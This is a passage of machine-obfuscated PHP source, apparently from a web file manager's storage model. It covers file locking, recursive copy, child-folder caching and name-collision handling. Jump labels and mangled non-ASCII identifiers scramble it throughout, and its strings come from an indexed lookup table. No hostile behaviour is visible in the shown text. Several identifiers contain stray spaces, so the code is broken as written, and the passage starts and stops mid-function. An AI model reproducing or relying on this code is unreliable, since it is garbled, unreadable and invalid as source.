_lockCheck($AÆÂ£Æ≥´¡, $fÔ¢âê§é¢) { goto fÆÎ•†≈¨™; bÑΩﬂ˜Ú‹’: $f≈ÊÃΩãÜ = array_reverse($this->parentLevelArray($AΩß‡§¡Û⁄[$aß“≈Ú©™Ï[459]])); foreach ($f≈ÊÃΩãÜ as $EØÏ¨Ôúû’) { $B‚¢‹‘–Âﬂ = $AÆÂ£Æ≥´¡ . $aß“≈Ú©™Ï[499] . $EØÏ¨Ôúû’; if (CacheLock::lockGet($aß“≈Ú©™Ï[500] . $B‚¢‹‘–Âﬂ)) { $AΩß‡§¡Û⁄ = $this->sourceInfo($EØÏ¨Ôúû’); CacheLock::setErrorMsg($aß“≈Ú©™Ï[157] . htmlspecialchars($AΩß‡§¡Û⁄[$aß“≈Ú©™Ï[28]]) . $aß“≈Ú©™Ï[476] . $B§€”πÖ˘ù); $this->_lockKey($B‚¢‹‘–Âﬂ, 1); $this->_lockKey($B‚¢‹‘–Âﬂ, 0); } } goto FﬁŒ€‡∞µâ; fÆÎ•†≈¨™: $aß“≈Ú©™Ï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AΩß‡§¡Û⁄ = $this->sourceInfo($fÔ¢âê§é¢); $B‚¢‹‘–Âﬂ = $AÆÂ£Æ≥´¡ . $aß“≈Ú©™Ï[91] . $fÔ¢âê§é¢; goto aˆäﬂ”óÃã; aˆäﬂ”óÃã: $this->_lockTimeStart[$B‚¢‹‘–Âﬂ] = timeFloat(); if (!is_array($AΩß‡§¡Û⁄)) { return; } $B§€”πÖ˘ù = LNG($aß“≈Ú©™Ï[498]); goto Dùê∑¢ûÏâ; Dùê∑¢ûÏâ: CacheLock::setErrorMsg($aß“≈Ú©™Ï[157] . htmlspecialchars($AΩß‡§¡Û⁄[$aß“≈Ú©™Ï[28]]) . $aß“≈Ú©™Ï[476] . $B§€”πÖ˘ù); $this->_lockKey($B‚¢‹‘–Âﬂ, 1); $this->_lockKey($B‚¢‹‘–Âﬂ, 0); goto bÑΩﬂ˜Ú‹’; FﬁŒ€‡∞µâ: } private function _lockCheckEnd($bØ¥·ÃÇ∑¿, $D´„Àœ”Ï¯) { goto Fìõìºû¶Î; E˘¿¿˘¢Ú∞: if (!isset($this->_lockTimeStart[$c≥¡Œîäàﬁ])) { return; } $AÍ“∆“«•ç = timeFloat() - $this->_lockTimeStart[$c≥¡Œîäàﬁ]; unset($this->_lockTimeStart[$c≥¡Œîäàﬁ]); goto fÍıÎ†ãëé; Fìõìºû¶Î: $dØ•úµÜèå =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c≥¡Œîäàﬁ = $bØ¥·ÃÇ∑¿ . $dØ•úµÜèå[91] . $D´„Àœ”Ï¯; CacheLock::setErrorMsg($dØ•úµÜèå[361]); goto E˘¿¿˘¢Ú∞; fÍıÎ†ãëé: if ($AÍ“∆“«•ç > 0.5) { unset(self::$cacheSourceInfo[$dØ•úµÜèå[410] . $D´„Àœ”Ï¯]); } $BÁ≈¯◊äŒ” = $this->sourceInfo($D´„Àœ”Ï¯); if (!$BÁ≈¯◊äŒ”) { show_json(LNG($dØ•úµÜèå[101]), !1); } goto fëà’„¡Ù¬; fëà’„¡Ù¬: } private function _lockParent($b∆Êƒ°û§”, $bâÌÏ®ÿ§Œ, $E≤‡Ë√„öÃ) { if (!$this->autoLockSet) { return; } $D´ù¢∫’µ¥ = $this->sourceInfo($b∆Êƒ°û§”); if (!is_array($D´ù¢∫’µ¥)) { return; } $Bé†°ë¬ú‹ = array_reverse($this->parentLevelArray($D´ù¢∫’µ¥[$_SERVER[Ä¿¡‡öóµŸﬂ‡][459]])); foreach ($Bé†°ë¬ú‹ as $cÖ“¶ìûû¿) { $this->_lockEvent($cÖ“¶ìûû¿, $bâÌÏ®ÿ§Œ, $E≤‡Ë√„öÃ); } } private function _lockEvent($Fï‹àÉÇ‚ı, $FôÏπöŸ∫, $C’êãÊˆ‰◊) { $aÚì≠∏¶ÆÕ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$this->autoLockSet) { return; } foreach ($FôÏπöŸ∫ as $C†¨öùâı≤) { $DúÆÜ“âﬂÃ = $C†¨öùâı≤ . $aÚì≠∏¶ÆÕ[91] . $Fï‹àÉÇ‚ı; if ($C’êãÊˆ‰◊ && CacheLock::lockGet($aÚì≠∏¶ÆÕ[500] . $DúÆÜ“âﬂÃ)) { continue; } $this->_lockKey($DúÆÜ“âﬂÃ, $C’êãÊˆ‰◊); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($B´„„‰¢¨Ç, $CØ≈∞®È∫Ç = 1) { $eªÛÏ‘‡øç = $_SERVER[Ä¿¡‡öóµŸﬂ‡][500] . md5($B´„„‰¢¨Ç); if ($CØ≈∞®È∫Ç) { if (isset(self::$_lockItemArr[$eªÛÏ‘‡øç])) { return; } self::$_lockItemArr[$eªÛÏ‘‡øç] = 1; CacheLock::lock($eªÛÏ‘‡øç, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$eªÛÏ‘‡øç])) { return; } unset(self::$_lockItemArr[$eªÛÏ‘‡øç]); CacheLock::unlock($eªÛÏ‘‡øç); } } public function isParentOf($D‘îï¯ÀËê, $aòŒÉôï∆Õ) { goto eáÑËË¶‰; Cèïå±ëÈπ: $Cπ¶øÍêÿÏ = $Fé€∏çÎ´œ[$D≈âõ‘Ø∑Ñ[459]] . $Fé€∏çÎ´œ[$D≈âõ‘Ø∑Ñ[369]] . $D≈âõ‘Ø∑Ñ[47]; $dÓÌÖ¡æüÊ = $dŸ≈À¯Ùæò[$D≈âõ‘Ø∑Ñ[459]] . $dŸ≈À¯Ùæò[$D≈âõ‘Ø∑Ñ[369]] . $D≈âõ‘Ø∑Ñ[47]; $bÛêûåØÈœ = strpos($dÓÌÖ¡æüÊ, $Cπ¶øÍêÿÏ) === 0; goto CèéÉ√∑˘¥; CèéÉ√∑˘¥: return $bÛêûåØÈœ; goto CèﬂÙ•ƒ¬Ô; eáÑËË¶‰: $D≈âõ‘Ø∑Ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fé€∏çÎ´œ = $this->sourceInfo($D‘îï¯ÀËê); $dŸ≈À¯Ùæò = $this->sourceInfo($aòŒÉôï∆Õ); goto Cèïå±ëÈπ; CèﬂÙ•ƒ¬Ô: } private $targetIsDelete = 0; public function copy($aÃÚÇ…Œ∫£, $b¿›è¯æçö, $eË•¡≥Ñáö = REPEAT_REPLACE, $b‰êä©ƒ∆Ü = '') { goto EÃë≈Ç¯èõ; EÃë≈Ç¯èõ: $eê∫¡∂Õ∞Ù =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FÇ°ÉÉ”’® = $this->sourceInfo($aÃÚÇ…Œ∫£); $D£Öåèø∏— = $this->sourceInfo($b¿›è¯æçö); goto B·Û‚°ñÉÒ; fË¡è€îµ§: $this->lockCopyStart($aÃÚÇ…Œ∫£); $this->lockWriteStart($b¿›è¯æçö, $DÃ·ë≈® ∏); $E¬ª°ˆŒÖ™ = array($eê∫¡∂Õ∞Ù[501] => array(), $eê∫¡∂Õ∞Ù[502] => array(), $eê∫¡∂Õ∞Ù[503] => array()); goto Cë°—À°Õﬂ; f©¥ŒçÀŒØ: $this->saveAll($E¬ª°ˆŒÖ™[$eê∫¡∂Õ∞Ù[503]]); Model($eê∫¡∂Õ∞Ù[167])->linkAdd($E¬ª°ˆŒÖ™[$eê∫¡∂Õ∞Ù[501]]); $this->folderSizeReset($b¿›è¯æçö); goto c¡ÖúÀÉ†Ã; Cäº¥ËÙ‘Ú: if ($FÇ°ÉÉ”’®[$eê∫¡∂Õ∞Ù[370]] == $eê∫¡∂Õ∞Ù[83] && $d‡ˆíìµì == $BΩåÊ≠Éßµ) { $this->folderSizeResetChildren($d‡ˆíìµì); } Model($eê∫¡∂Õ∞Ù[504])->addAll($E¬ª°ˆŒÖ™[$eê∫¡∂Õ∞Ù[502]], array(), !0); if ($d‡ˆíìµì != $BΩåÊ≠Éßµ || $FÇ°ÉÉ”’®[$eê∫¡∂Õ∞Ù[370]] == $eê∫¡∂Õ∞Ù[83]) { Model($eê∫¡∂Õ∞Ù[505])->eventCopy($BΩåÊ≠Éßµ); } goto f©¥ŒçÀŒØ; Cë°—À°Õﬂ: $this->targetIsDelete = intval($FÇ°ÉÉ”’®[$eê∫¡∂Õ∞Ù[397]]); $d‡ˆíìµì = $this->fileNameExistCache($b¿›è¯æçö, $FÇ°ÉÉ”’®[$eê∫¡∂Õ∞Ù[28]]); $BΩåÊ≠Éßµ = $this->_copy($aÃÚÇ…Œ∫£, $b¿›è¯æçö, $eË•¡≥Ñáö, $E¬ª°ˆŒÖ™, !0, $b‰êä©ƒ∆Ü); goto bÖÓüîÈåå; c¡ÖúÀÉ†Ã: $this->updateModifyTime($b¿›è¯æçö); return $BΩåÊ≠Éßµ; goto CÏÑÉ±ØÙ˘; bÖÓüîÈåå: $this->_childrenListClear(); $this->lockCopyEnd($aÃÚÇ…Œ∫£); $this->lockWriteEnd($b¿›è¯æçö, $DÃ·ë≈® ∏); goto Cäº¥ËÙ‘Ú; B·Û‚°ñÉÒ: if (!$FÇ°ÉÉ”’® || !$D£Öåèø∏— || $D£Öåèø∏—[$eê∫¡∂Õ∞Ù[370]] != $eê∫¡∂Õ∞Ù[83]) { return !1; } if ($this->isParentOf($aÃÚÇ…Œ∫£, $b¿›è¯æçö)) { return !1; } $DÃ·ë≈® ∏ = $b‰êä©ƒ∆Ü ? $b‰êä©ƒ∆Ü : $FÇ°ÉÉ”’®[$eê∫¡∂Õ∞Ù[28]]; goto fË¡è€îµ§; CÏÑÉ±ØÙ˘: } private function _copy($b‘•çÒø©≠, $aâŒÏò·ßº, $A∂¨à‚ãÀñ, &$D€ïñêœôƒ, $c√Ëœâ√ˆ†, $f≠ﬂëÇç∫° = '') { goto FÛÀà‹ßµ; Fè¬É¢æ—˜: return $AÇ†›ﬁ‹Ü‰; goto aË≠Õ„≈¥‘; FÛÀà‹ßµ: $dπï»ú€»û =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D˘¥¨Ãä»˜ = $this->sourceInfoCache($b‘•çÒø©≠); $CÌÃ–à◊…¿ = $D˘¥¨Ãä»˜[$dπï»ú€»û[370]] == $dπï»ú€»û[83]; goto eë¶¯Ω≥Ë˜; B√ôÒƒ˘Ìå: if (!$AúöÖÙ©ﬂ÷) { return $this->_copyCreate($b‘•çÒø©≠, $aâŒÏò·ßº, $eË‡•ò√⁄Í, $D€ïñêœôƒ); } $AÇ†›ﬁ‹Ü‰ = $AúöÖÙ©ﬂ÷; if ($CÌÃ–à◊…¿) { if ($A∂¨à‚ãÀñ == REPEAT_RENAME_FOLDER) { $eË‡•ò√⁄Í = $this->fileNameAutoCache($aâŒÏò·ßº, $eË‡•ò√⁄Í, $A∂¨à‚ãÀñ, $CÌÃ–à◊…¿); $AÇ†›ﬁ‹Ü‰ = $this->_copyCreate($b‘•çÒø©≠, $aâŒÏò·ßº, $eË‡•ò√⁄Í, $D€ïñêœôƒ); } else { $b◊ê–é°Éù = $this->_childrenList($b‘•çÒø©≠); foreach ($b◊ê–é°Éù as $A••∏Ê∫ˆ) { $this->_copy($A••∏Ê∫ˆ[$dπï»ú€»û[369]], $AúöÖÙ©ﬂ÷, $A∂¨à‚ãÀñ, $D€ïñêœôƒ, !1); } } } else { if ($A∂¨à‚ãÀñ == REPEAT_RENAME || $A∂¨à‚ãÀñ == REPEAT_RENAME_FOLDER) { $eË‡•ò√⁄Í = $this->fileNameAutoCache($aâŒÏò·ßº, $eË‡•ò√⁄Í, $A∂¨à‚ãÀñ, $CÌÃ–à◊…¿); $AÇ†›ﬁ‹Ü‰ = $this->_copyCreate($b‘•çÒø©≠, $aâŒÏò·ßº, $eË‡•ò√⁄Í, $D€ïñêœôƒ); } else { if ($A∂¨à‚ãÀñ == REPEAT_REPLACE) { $fö‡¨è≤ﬂà = $this->sourceInfoCache($AúöÖÙ©ﬂ÷); $eöìÊ¨ôá± = $this->fileHistory($fö‡¨è≤ﬂà, $D˘¥¨Ãä»˜[$dπï»ú€»û[419]], $D˘¥¨Ãä»˜[$dπï»ú€»û[77]]); if ($eöìÊ¨ôá±) { $D€ïñêœôƒ[$dπï»ú€»û[501]][] = $D˘¥¨Ãä»˜[$dπï»ú€»û[419]]; } } else { if ($A∂¨à‚ãÀñ == REPEAT_SKIP) { } } } Hook::trigger($dπï»ú€»û[506], array($dπï»ú€»û[507], $D˘¥¨Ãä»˜, 0)); } goto Fè¬É¢æ—˜; eë¶¯Ω≥Ë˜: $eË‡•ò√⁄Í = $f≠ﬂëÇç∫° ? $f≠ﬂëÇç∫° : $D˘¥¨Ãä»˜[$dπï»ú€»û[28]]; $AúöÖÙ©ﬂ÷ = $this->fileNameExistCache($aâŒÏò·ßº, $eË‡•ò√⁄Í); if ($c√Ëœâ√ˆ†) { $this->_childrenAllMake($b‘•çÒø©≠); if ($CÌÃ–à◊…¿ && $AúöÖÙ©ﬂ÷) { $this->_childrenAllMake($AúöÖÙ©ﬂ÷); } } goto B√ôÒƒ˘Ìå; aË≠Õ„≈¥‘: } private function _copyCreate($e¶¶ñèÕò£, $b≈ÎËŸÉ◊∂, $E©√âÍ»€‰, &$C¨¶üé÷¯∆) { goto c¯ÉÖﬂ‡ıË; fâÇõ≤»í≈: $this->addAll($f¿ÍÍÑ«¡à, array(), !1); $føﬁàÙıëî = $this->where(array($c›’≤è‚äÖ[461] => $cà¢øº“ˆÕ))->select(); $c◊ƒ√°ô±À = $this->_childrenMakeRelation($fœ€≥µ≤Òë, $føﬁàÙıëî); goto e◊π∂ﬁ‘‚¶; e◊π∂ﬁ‘‚¶: $c◊ƒ√°ô±À[$e¶¶ñèÕò£] = $cà¢øº“ˆÕ; $cÜ√•∫àπá = array(); $B´Ëß∂±œË = array(); goto Dı≥’áˆé¢; CØ∫°Ö∫ñ∫: $this->_childrenListAll($e¶¶ñèÕò£, $fœ€≥µ≤Òë); $EõÜ¶•ÎüÒ = count($fœ€≥µ≤Òë); if ($EõÜ¶•ÎüÒ == 0) { return $cà¢øº“ˆÕ; } goto C›È≈«ï≠§; fâ¨ÉîØΩ¶: $cà¢øº“ˆÕ = $this->add($FÑîõÿ≈™Ω); $d•≤°ﬂÒê‹ = array($c›’≤è‚äÖ[369] => $cà¢øº“ˆÕ, $c›’≤è‚äÖ[28] => $E©√âÍ»€‰); $this->_copyApplyMeta($d•≤°ﬂÒê‹, $C¨¶üé÷¯∆); goto AÃÖ—˜Ü¢Í; AÃ‚®†ñ“Ü: $this->chunkEventSet($c›’≤è‚äÖ[515], array($c›’≤è‚äÖ[516], $FÑîõÿ≈™Ω, $EõÜ¶•ÎüÒ)); $this->saveAll($B´Ëß∂±œË); return $cà¢øº“ˆÕ; goto cÙíï‰â“ö; Aﬂ∞è‰π¿Ô: $FÑîõÿ≈™Ω = $this->_makeItemData($A∏Ø—à”ıŸ, $fÇ≈∏Ö…Œ , $E©√âÍ»€‰); Hook::trigger($c›’≤è‚äÖ[508], $FÑîõÿ≈™Ω); Hook::trigger($c›’≤è‚äÖ[509], array($c›’≤è‚äÖ[510], $FÑîõÿ≈™Ω, 0)); goto fâ¨ÉîØΩ¶; c¯ÉÖﬂ‡ıË: $c›’≤è‚äÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A∏Ø—à”ıŸ = $this->sourceInfoCache($e¶¶ñèÕò£); $fÇ≈∏Ö…Œ  = $this->sourceInfoCache($b≈ÎËŸÉ◊∂); goto Aﬂ∞è‰π¿Ô; AÃÖ—˜Ü¢Í: if ($A∏Ø—à”ıŸ[$c›’≤è‚äÖ[370]] != $c›’≤è‚äÖ[83]) { $C¨¶üé÷¯∆[$c›’≤è‚äÖ[501]][] = $A∏Ø—à”ıŸ[$c›’≤è‚äÖ[419]]; return $cà¢øº“ˆÕ; } $fœ€≥µ≤Òë = array(); $f¿ÍÍÑ«¡à = array(); goto CØ∫°Ö∫ñ∫; C›È≈«ï≠§: $D‘⁄∞óœãà = $this->sourceInfo($cà¢øº“ˆÕ); foreach ($fœ€≥µ≤Òë as $bû÷§òøÆØ) { $B∑Ì“ç“á∑ = $this->_makeItemData($bû÷§òøÆØ, $D‘⁄∞óœãà, $bû÷§òøÆØ[$c›’≤è‚äÖ[28]]); $B∑Ì“ç“á∑[$c›’≤è‚äÖ[459]] = $bû÷§òøÆØ[$c›’≤è‚äÖ[459]]; $f¿ÍÍÑ«¡à[] = $B∑Ì“ç“á∑; } $this->chunkEventSet($c›’≤è‚äÖ[511], array($c›’≤è‚äÖ[512], $FÑîõÿ≈™Ω, $EõÜ¶•ÎüÒ)); goto fâÇõ≤»í≈; Dı≥’áˆé¢: foreach ($føﬁàÙıëî as $bû÷§òøÆØ) { $D∏ùﬂ∑¶Ÿµ = $bû÷§òøÆØ[$c›’≤è‚äÖ[369]]; $BáíééúÂÈ = $this->_childrenMatch($c◊ƒ√°ô±À, $bû÷§òøÆØ, $D‘⁄∞óœãà); $cÜ√•∫àπá[] = array($c›’≤è‚äÖ[369], $D∏ùﬂ∑¶Ÿµ, $c›’≤è‚äÖ[461], $BáíééúÂÈ[$c›’≤è‚äÖ[461]]); $B´Ëß∂±œË[] = array($c›’≤è‚äÖ[369], $D∏ùﬂ∑¶Ÿµ, $c›’≤è‚äÖ[459], $BáíééúÂÈ[$c›’≤è‚äÖ[459]]); $this->_copyApplyMeta($bû÷§òøÆØ, $C¨¶üé÷¯∆); if ($bû÷§òøÆØ[$c›’≤è‚äÖ[370]] != $c›’≤è‚äÖ[83]) { $C¨¶üé÷¯∆[$c›’≤è‚äÖ[501]][] = $bû÷§òøÆØ[$c›’≤è‚äÖ[419]]; } } $this->chunkEventSet($c›’≤è‚äÖ[513], array($c›’≤è‚äÖ[514], $FÑîõÿ≈™Ω, $EõÜ¶•ÎüÒ)); $this->saveAll($cÜ√•∫àπá); goto AÃ‚®†ñ“Ü; cÙíï‰â“ö: } private function _childrenMakeRelation($fÒ‹¥òôçï, $FŒ‡ßΩ¬∑¡) { $CÀñΩ¥ÉÌ≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bã∏æ˜õıæ = array(); $B∑Öä’öâÛ = array(); foreach ($fÒ‹¥òôçï as $cÇÿ∫•ë©) { $FÁââÈüáï = $cÇÿ∫•ë©[$CÀñΩ¥ÉÌ≤[28]] . $CÀñΩ¥ÉÌ≤[8] . $cÇÿ∫•ë©[$CÀñΩ¥ÉÌ≤[459]]; $Bã∏æ˜õıæ[$FÁââÈüáï] = $cÇÿ∫•ë©[$CÀñΩ¥ÉÌ≤[369]]; } foreach ($FŒ‡ßΩ¬∑¡ as $cÇÿ∫•ë©) { $FÁââÈüáï = $cÇÿ∫•ë©[$CÀñΩ¥ÉÌ≤[28]] . $CÀñΩ¥ÉÌ≤[8] . $cÇÿ∫•ë©[$CÀñΩ¥ÉÌ≤[459]]; $a¥⁄ﬂàÖ• = $Bã∏æ˜õıæ[$FÁââÈüáï]; $B∑Öä’öâÛ[$a¥⁄ﬂàÖ•] = $cÇÿ∫•ë©[$CÀñΩ¥ÉÌ≤[369]]; } return $B∑Öä’öâÛ; } private function _childrenMatch($eÚêŸÛ∏ãØ, $AèÔÑäÿÌÊ, $dÑêÖè≥æ°) { goto f’Ñ€ÏÔﬂ«; fÇñã∆ä£œ: foreach ($B›»Î‚âæõ as $dÿ“œÃÙÖ∑) { if (isset($eÚêŸÛ∏ãØ[$dÿ“œÃÙÖ∑])) { $bªìπ¨ª˜Ø .= $eÚêŸÛ∏ãØ[$dÿ“œÃÙÖ∑] . $e∑ΩÃÙÁ‰[517]; } } $bªìπ¨ª˜Ø = rtrim($bªìπ¨ª˜Ø, $e∑ΩÃÙÁ‰[47]) . $e∑ΩÃÙÁ‰[47]; $DÎ∞»åÍÂ‡ = $this->parentLevelArray($bªìπ¨ª˜Ø); goto e¿àÛÜ’÷…; f’Ñ€ÏÔﬂ«: $e∑ΩÃÙÁ‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bªìπ¨ª˜Ø = $dÑêÖè≥æ°[$e∑ΩÃÙÁ‰[459]]; $B›»Î‚âæõ = $this->parentLevelArray($AèÔÑäÿÌÊ[$e∑ΩÃÙÁ‰[459]]); goto fÇñã∆ä£œ; e¿àÛÜ’÷…: $Féøç ì‡¶ = $DÎ∞»åÍÂ‡[count($DÎ∞»åÍÂ‡) - 1]; return array($e∑ΩÃÙÁ‰[461] => $Féøç ì‡¶, $e∑ΩÃÙÁ‰[459] => $bªìπ¨ª˜Ø); goto fÿÌ°í‡‡÷; fÿÌ°í‡‡÷: } private function _makeItemData($FÖÂñ£ïë‡, $FÍ÷›™»«≤, $Aˆ¶Ü€À∞÷) { $CŒ‚®¬æÉõ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E¡ﬂº⁄çı≤ = array($CŒ‚®¬æÉõ[518] => $FÖÂñ£ïë‡[$CŒ‚®¬æÉõ[370]], $CŒ‚®¬æÉõ[386] => $Aˆ¶Ü€À∞÷, $CŒ‚®¬æÉõ[519] => $FÖÂñ£ïë‡[$CŒ‚®¬æÉõ[372]], $CŒ‚®¬æÉõ[420] => $FÖÂñ£ïë‡[$CŒ‚®¬æÉõ[419]], $CŒ‚®¬æÉõ[520] => $FÖÂñ£ïë‡[$CŒ‚®¬æÉõ[77]], $CŒ‚®¬æÉõ[521] => $FÍ÷›™»«≤[$CŒ‚®¬æÉõ[371]], $CŒ‚®¬æÉõ[522] => $FÍ÷›™»«≤[$CŒ‚®¬æÉõ[456]], $CŒ‚®¬æÉõ[523] => USER_ID, $CŒ‚®¬æÉõ[524] => USER_ID, $CŒ‚®¬æÉõ[368] => $FÍ÷›™»«≤[$CŒ‚®¬æÉõ[369]], $CŒ‚®¬æÉõ[525] => $FÍ÷›™»«≤[$CŒ‚®¬æÉõ[459]] . $FÍ÷›™»«≤[$CŒ‚®¬æÉõ[369]] . $CŒ‚®¬æÉõ[47], $CŒ‚®¬æÉõ[396] => 0, $CŒ‚®¬æÉõ[526] => $CŒ‚®¬æÉõ[33]); return $E¡ﬂº⁄çı≤; } private function _copyApplyMeta($cˆ≈’˜ÿÉä, &$Eõ›áóçΩ») { $f¿ßó££∆∏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Dß∫ÙØª√ı = $cˆ≈’˜ÿÉä[$f¿ßó££∆∏[369]]; $EÑÂ‹–»ïã = $cˆ≈’˜ÿÉä[$f¿ßó££∆∏[28]]; if (!isset($cˆ≈’˜ÿÉä[$f¿ßó££∆∏[527]]) || !$cˆ≈’˜ÿÉä[$f¿ßó££∆∏[527]] || $cˆ≈’˜ÿÉä[$f¿ßó££∆∏[527]] == $f¿ßó££∆∏[468]) { $Eõ›áóçΩ»[$f¿ßó££∆∏[503]][] = array($f¿ßó££∆∏[369], $Dß∫ÙØª√ı, $f¿ßó££∆∏[527], short_id($Dß∫ÙØª√ı)); } if (Input::check($EÑÂ‹–»ïã, $f¿ßó££∆∏[528])) { $Eõ›áóçΩ»[$f¿ßó££∆∏[502]][] = array($f¿ßó££∆∏[369] => $Dß∫ÙØª√ı, $f¿ßó££∆∏[89] => $f¿ßó££∆∏[416], $f¿ßó££∆∏[359] => str_replace($f¿ßó££∆∏[50], $f¿ßó££∆∏[33], Pinyin::encode($EÑÂ‹–»ïã))); $Eõ›áóçΩ»[$f¿ßó££∆∏[502]][] = array($f¿ßó££∆∏[369] => $Dß∫ÙØª√ı, $f¿ßó££∆∏[89] => $f¿ßó££∆∏[415], $f¿ßó££∆∏[359] => Pinyin::encode($EÑÂ‹–»ïã, $f¿ßó££∆∏[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Fç‚≤’≈ëÁ) { goto B∫¬µáÜï ; cØæ»éˆ∞Õ: $f£ÖÙıæ„∂ = array_to_keyvalue($f£ÖÙıæ„∂, $F≥Àı≠Ñ†∂[369]); foreach ($f£ÖÙıæ„∂ as $Aì±∑ß∏ØÁ) { $Eå‰’Øº∂Ñ = $Aì±∑ß∏ØÁ[$F≥Àı≠Ñ†∂[461]]; $Fç‚≤’≈ëÁ = $Aì±∑ß∏ØÁ[$F≥Àı≠Ñ†∂[369]]; if (!isset($this->_childrenListCache[$Fç‚≤’≈ëÁ]) && $Aì±∑ß∏ØÁ[$F≥Àı≠Ñ†∂[370]] == $F≥Àı≠Ñ†∂[83]) { $this->_childrenListCache[$Fç‚≤’≈ëÁ] = array(); } if (!isset($this->_childrenListCache[$Eå‰’Øº∂Ñ])) { $this->_childrenListCache[$Eå‰’Øº∂Ñ] = array(); } $this->_childrenListCache[$Eå‰’Øº∂Ñ][$Fç‚≤’≈ëÁ] = $Aì±∑ß∏ØÁ; $this->_childrenItemCache[$Fç‚≤’≈ëÁ] = $Aì±∑ß∏ØÁ; } goto AÃﬁ∏Û…—Ω; B∫¬µáÜï : $F≥Àı≠Ñ†∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÑÏï‘Û”° = $this->sourceInfo($Fç‚≤’≈ëÁ); $aééó‰‹ﬁ≤ = $F≥Àı≠Ñ†∂[530]; goto Aî‚äÛãÇñ; Aî‚äÛãÇñ: $Cï’ªÖ∂ıï = array($F≥Àı≠Ñ†∂[459] => array($F≥Àı≠Ñ†∂[483], $dÑÏï‘Û”°[$F≥Àı≠Ñ†∂[459]] . $Fç‚≤’≈ëÁ . $F≥Àı≠Ñ†∂[484]), $F≥Àı≠Ñ†∂[397] => $this->targetIsDelete); $f£ÖÙıæ„∂ = $this->field($aééó‰‹ﬁ≤)->where($Cï’ªÖ∂ıï)->select(); if (!$f£ÖÙıæ„∂) { return; } goto cØæ»éˆ∞Õ; AÃﬁ∏Û…—Ω: } private function _childrenListAll($cì“Èå˜éî, &$B‡©ÑËéÊÖ) { $dÿåÕí¶ÒÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($this->_childrenListCache[$cì“Èå˜éî])) { return; } $a«úâ•∫µ¥ = $this->_childrenListCache[$cì“Èå˜éî]; foreach ($a«úâ•∫µ¥ as $bû—£∂©Ø∞ => $eô∫Üí ãÎ) { $B‡©ÑËéÊÖ[$bû—£∂©Ø∞] = $eô∫Üí ãÎ; if ($eô∫Üí ãÎ[$dÿåÕí¶ÒÑ[370]] == $dÿåÕí¶ÒÑ[83]) { $this->_childrenListAll($bû—£∂©Ø∞, $B‡©ÑËéÊÖ); } } } private function sourceInfoCache($B§ÊÛ∑Éç„) { if (isset($this->_childrenItemCache[$B§ÊÛ∑Éç„])) { return $this->_childrenItemCache[$B§ÊÛ∑Éç„]; } return $this->sourceInfo($B§ÊÛ∑Éç„); } private function _childrenList($AõêºÜÒÙ∂) { if (isset($this->_childrenListCache[$AõêºÜÒÙ∂])) { return $this->_childrenListCache[$AõêºÜÒÙ∂]; } return $this->_childrenListSelect($AõêºÜÒÙ∂); } private function _childrenListSelect($dÌÆøËùÏ◊) { goto CÔ⁄◊îΩÑ˜; CÔ⁄◊îΩÑ˜: $b›„¡ç∆÷ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e•òÑÏ„ı– = array($b›„¡ç∆÷ñ[461] => $dÌÆøËùÏ◊, $b›„¡ç∆÷ñ[397] => $this->targetIsDelete); $FÑ∞–ﬁ≥ô© = $this->where($e•òÑÏ„ı–)->select(); goto d≥˘Í∞∏ÿ˘; d√ø£≠°‰—: foreach ($B–ö±—∂¯â as $dÌÆøËùÏ◊ => $Eπ⁄‰ËàÈè) { $this->_childrenItemCache[$dÌÆøËùÏ◊] = $Eπ⁄‰ËàÈè; } return $B–ö±—∂¯â; goto Aöò∆îÛ’‡; d≥˘Í∞∏ÿ˘: $FÑ∞–ﬁ≥ô© = $FÑ∞–ﬁ≥ô© ? $FÑ∞–ﬁ≥ô© : array(); $B–ö±—∂¯â = array_to_keyvalue($FÑ∞–ﬁ≥ô©, $b›„¡ç∆÷ñ[369]); $this->_childrenListCache[$dÌÆøËùÏ◊] = $B–ö±—∂¯â; goto d√ø£≠°‰—; Aöò∆îÛ’‡: } private function fileNameExistCache($E‡ñÁ¿¡‹ö, $f∏ÏÉ±À’É) { $a∂ê‹‘ÙŒ“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f∏ÏÉ±À’É = strtolower($f∏ÏÉ±À’É); $A⁄ÁÔ˜Ïóí = $this->_childrenList($E‡ñÁ¿¡‹ö); foreach ($A⁄ÁÔ˜Ïóí as $F”åÜ√ºìÜ) { if ($f∏ÏÉ±À’É == strtolower($F”åÜ√ºìÜ[$a∂ê‹‘ÙŒ“[28]])) { return $F”åÜ√ºìÜ[$a∂ê‹‘ÙŒ“[369]]; } } return !1; } private function fileNameAutoCache($Aßõ‹ŸØ÷÷, $Bç¡€«àä⁄, $cπÊ¬†©≈„, $Eÿ°âﬂà‰ú) { $f€Øàâ˜Ûô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÔÉé◊äÇ· = $this->_childrenList($Aßõ‹ŸØ÷÷); $e¡ØŒã™¬ = array_to_keyvalue($cÔÉé◊äÇ·, $f€Øàâ˜Ûô[33], $f€Øàâ˜Ûô[28]); return $this->fileNameAutoGet($e¡ØŒã™¬, $Bç¡€«àä⁄, $cπÊ¬†©≈„, $Eÿ°âﬂà‰ú); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($bü‹≥≠‚ç«, $f◊„“©Ó£¯, $FÊÃ∑ÖõÑ = REPEAT_REPLACE, $F≥ù≤€ºˆØ = '') { goto B£›µ„–Ã∞; 